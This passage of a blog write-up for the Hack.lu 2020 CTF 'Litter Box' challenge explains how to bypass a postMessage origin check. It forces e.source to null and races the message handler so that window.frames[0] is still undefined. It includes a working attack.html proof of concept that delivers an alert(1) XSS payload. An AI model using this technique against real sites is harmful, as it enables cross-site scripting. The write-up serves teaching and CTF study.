-codedoc-code-line" data-content="      litterBoxWebsite.onload = () => {" id="code4-l17"><span class="lineCounter-0-0-13 -codedoc-line-counter">17<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterBoxWebsite<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14 highlight -codedoc-code-line" data-content="        postMessageWithNullSource(&quot;yolo&quot;) // --> same as postMessage, but e.source will be null" id="code4-l18"><span class="lineCounter-0-0-13 -codedoc-line-counter">18<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token function">postMessageWithNullSource</span><span class="token punctuation">(</span><span class="token string">"yolo"</span><span class="token punctuation">)</span> <span class="token comment">// --&gt; same as postMessage, but e.source will be null</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      }" id="code4-l19"><span class="lineCounter-0-0-13 -codedoc-line-counter">19<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </script>" id="code4-l20"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">20<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  </body>" id="code4-l21"><span class="lineCounter-0-0-13 -codedoc-line-counter">21<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</html>" id="code4-l22"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">22<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>Checking <code>e.source</code> on the breakpoint:</p><p><img src="img/breakpoint_src_null.PNG" alt="bp_source_null"></p><p>Nice! We got the left-hand side of the condition to be <code>null</code>. Let's check the equality table what the right side needs to be to make it pass:</p><p><img src="https://algassert.com/assets/2014-03-27-Better-JS-Equality-Table/grouped-table.png" alt="js_equality">
(<a href="https://algassert.com/visualization/2014/03/27/Better-JS-Equality-Table.html">Image Source</a>)</p><p>So the right hand side of the condition (<code>window.frames[0]</code>) needs to be eiter <code>null</code> or <code>undefined</code>.</p><h5 id="make-windowframes0-be-undefined" class="heading-0-0-10"><span class="anchor-0-0-11" data-ignore-text=""><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span>Make <code>window.frames[0]</code> be <code>undefined</code></h5><p>The only way I could think of making <code>window.frames[0]</code> be <code>undefined</code> was by removing the sandboxed iframe from the DOM. But there was no way to modify the DOM.</p><p>That's when I got the idea that maybe it was possible to trigger the <code>onmessage</code> event before the whole HTML Document was loaded.
If we managed to execute the <code>onmessage</code> event before the document loading reached the sandboxed iframe element, we would have <code>window.frames[0]</code> being <code>undefined</code>.</p><p>But is this possible? Is it possible that our postMessage will be handled by the Javscript Scheduler while the HTML Document is being parsed? The answer is no. HOWEVER: if there is a script element that is not async, the HTML Parsing is stopped and the Javascript Scheduler is waiting until the script is finished loading over the network.</p><p><img src="https://flaviocopes.com/javascript-async-defer/without-defer-async-head.png" alt="html_parsing">
(<a href="https://flaviocopes.com/javascript-async-defer/">Image Source</a>)</p><p>During this time that the script is loading, the Javascript Scheduer is free to do other sutf: including processing received <code>postMessage</code> events that are not handled yet!</p><p>So let's try to race condition postMessage/onmessage to execute while the <code>main.js</code> script is loading:</p><pre class="with-bar"><code class="html -codedoc-code-snippet code-0-0-12" tabindex="0"><span class="wmbar-0-0-15"><span></span><span></span><span></span><span>attack.html</span></span><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code5-l1"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">1<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="<html>" id="code5-l2"><span class="lineCounter-0-0-13 -codedoc-line-counter">2<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  <body>" id="code5-l3"><span class="lineCounter-0-0-13 -codedoc-line-counter">3<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <iframe id=&quot;litterBoxWebsite&quot;></iframe>" id="code5-l4"><span class="lineCounter-0-0-13 -codedoc-line-counter">4<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>litterBoxWebsite<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code5-l5"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">5<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </div>" id="code5-l6"><span class="lineCounter-0-0-13 -codedoc-line-counter">6<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    <script>" id="code5-l7"><span class="lineCounter-0-0-13 -codedoc-line-counter">7<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code5-l8"><span class="lineCounter-0-0-13 -codedoc-line-counter">8<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      let postMessageWithNullSource = (message) => {" id="code5-l9"><span class="lineCounter-0-0-13 -codedoc-line-counter">9<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token keyword">let</span> <span class="token function-variable function">postMessageWithNullSource</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        let newWindow = document.createElement(&quot;iframe&quot;)" id="code5-l10"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">10<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">let</span> newWindow <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        document.body.appendChild(newWindow)" id="code5-l11"><span class="lineCounter-0-0-13 -codedoc-line-counter">11<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>newWindow<span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        newWindow.contentWindow.eval(`top.litterBoxWebsite.contentWindow.postMessage(&quot;${message}&quot;, '*')`)" id="code5-l12"><span class="lineCounter-0-0-13 -codedoc-line-counter">12<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        newWindow<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">top.litterBoxWebsite.contentWindow.postMessage("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>message<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">", '*')</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        document.body.removeChild(newWindow)" id="code5-l13"><span class="lineCounter-0-0-13 -codedoc-line-counter">13<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>newWindow<span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      }" id="code5-l14"><span class="lineCounter-0-0-13 -codedoc-line-counter">14<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code5-l15"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">15<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      let stopTryRaceConditioning = false" id="code5-l16"><span class="lineCounter-0-0-13 -codedoc-line-counter">16<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token keyword">let</span> stopTryRaceConditioning <span class="token operator">=</span> <span class="token boolean">false</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      let raceCondition = () => {" id="code5-l17"><span class="lineCounter-0-0-13 -codedoc-line-counter">17<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token keyword">let</span> <span class="token function-variable function">raceCondition</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        postMessageWithNullSource(&quot;alert(1)&quot;)" id="code5-l18"><span class="lineCounter-0-0-13 -codedoc-line-counter">18<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token function">postMessageWithNullSource</span><span class="token punctuation">(</span><span class="token string">"alert(1)"</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        if (!stopTryRaceConditioning) { // <-- repeat until iframe is fully loaded" id="code5-l19"><span class="lineCounter-0-0-13 -codedoc-line-counter">19<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stopTryRaceConditioning<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// &lt;-- repeat until iframe is fully loaded</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="          setTimeout(raceCondition, 1) // <-- repeat after one ms, let scheduler do other stuff during that time" id="code5-l20"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">20<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>          <span class="token function">setTimeout</span><span class="token punctuation">(</span>raceCondition<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// &lt;-- repeat after one ms, let scheduler do other stuff during that time</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        }" id="code5-l21"><span class="lineCounter-0-0-13 -codedoc-line-counter">21<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      }" id="code5-l22"><span class="lineCounter-0-0-13 -codedoc-line-counter">22<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="" id="code5-l23"><span class="lineCounter-0-0-13 -codedoc-line-counter">23<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      litterBoxWebsite.src = &quot;https://litterbox.cf/?src=data:,&quot;" id="code5-l24"><span class="lineCounter-0-0-13 -codedoc-line-counter">24<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterBoxWebsite<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://litterbox.cf/?src=data:,"</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      litterBoxWebsite.onload = () => { " id="code5-l25"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">25<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      litterBoxWebsite<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> </div><br><div class="line-0-0-14  -codedoc-code-line" data-content="        stopTryRaceConditioning = true" id="code5-l26"><span class="lineCounter-0-0-13 -codedoc-line-counter">26<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>        stopTryRaceConditioning <span class="token operator">=</span> <span class="token boolean">true</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      }" id="code5-l27"><span class="lineCounter-0-0-13 -codedoc-line-counter">27<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token punctuation">}</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="      raceCondition()" id="code5-l28"><span class="lineCounter-0-0-13 -codedoc-line-counter">28<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>      <span class="token function">raceCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="    </script>" id="code5-l29"><span class="lineCounter-0-0-13 -codedoc-line-counter">29<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="  </body>" id="code5-l30"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">30<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></div><br><div class="line-0-0-14  -codedoc-code-line" data-content="</html>" id="code5-l31"><span class="lineCounter-0-0-13 prim -codedoc-line-counter">31<span class="-codedoc-line-link"><span class="icon-font" data-ignore-text="" style="vertical-align: sub">link</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></div><br></code></pre><p>If we are a bit lucky, the scheduler has time to execute our postMessage request during the laoding of the <code>script.js</code>, which is before the sandboxed iframe is in the DOM. As a result <code>e.source == window.frames[0]</code> &lt;==&gt; <code>null == undefined</code> &lt;==&gt; <code>true</code></p><p>Using the chrome profiler, one can see that onmessage is called between the two parseHtml parts:</p><p><img src="img/profiler.PNG" alt="profiler"></p><p>I guess I was pretty lucky that it worked first try. Sometimes, the Javascript scheduler is just not fast enough to process our postMessage request before the <code>script.js</code> has finished loading. In that case, one can simply repeat the whole process until successful.  </p><div class="contentnav-0-0-8" data-no-search=""><a href="#the-challenge" class="h1" data-content-highlight="the-challenge">The challenge</a><a href="#source-code" class="h2" data-content-highlight="source-code">Source Code</a><a href="#the-solution" class="h1" data-content-highlight="the-solution">The solution</a><a href="#baby-steps" class="h2" data-content-highlight="baby-steps">Baby steps</a><a href="#bypassing-esource--windowframes0" class="h2" data-content-highlight="bypassing-esource--windowframes0">Bypassing e.source == window.frames[0]</a><a href="#1-make-esource-reference-the-same-object-as-windowframes0" class="h3" data-content-highlight="1-make-esource-reference-the-same-object-as-windowframes0">1. make e.source reference the same object as window.frames[0]</a><a href="#2-make-windowframes0-reference-the-same-object-as-esource" class="h3" data-content-highlight="2-make-windowframes0-reference-the-same-object-as-esource">2. make window.frames[0] reference the same object as e.source</a><a href="#the-third-possibility-i-thought-there-were-only-2-possibilities" class="h3" data-content-highlight="the-third-possibility-i-thought-there-were-only-2-possibilities">The third possibility: I thought there were only 2 possibilities</a><a href="#make-esource-be-null" class="h5" data-content-highlight="make-esource-be-null">Make e.source be null</a><a href="#make-windowframes0-be-undefined" class="h5" data-content-highlight="make-windowframes0-be-undefined">Make window.frames[0] be undefined</a></div></div><div id="-codedoc-toc" class="toc-0-0-5"><script>
     if (window.matchMedia('(min-width: 1200px)').matches) {
       if (!localStorage.getItem('-codedoc-toc-active')) {
         localStorage.setItem('-codedoc-toc-active', "true");
       }
     }
     </script><div class="content-0-0-6"><p><a href="/blog/">Home</a>
<a href="/blog/own-xss-challenge">Own XSS Challenge Writeup</a>
<a href="/blog/hack_lu_litter_box">Hack.lu 2020 CTF - Litter Box - Writeup</a></p></div></div><div class="footer-0-0-4"><div class="left"><script id="_uPIFoFTdp">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("_uPIFoFTdp", "k0lYj9deiYXngpZFqYY0vQ==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div><div class="main"><div class="inside"></div></div><div class="right"><script id="ORGOANaFRs">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("ORGOANaFRs", "QtGDrozMmpfzLYU0jY3n+w==", {});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></div></div><script id="kEyAGnzgGg">(function(){function load(){if (window.__sdh_transport){window.__sdh_transport("kEyAGnzgGg", "Rs0VnrLCFSwfOm1o3R6OHg==", {"namespace":"/blog"});} }; if (document.readyState == 'complete') load(); else window.addEventListener('load', load); })()</script></body></html>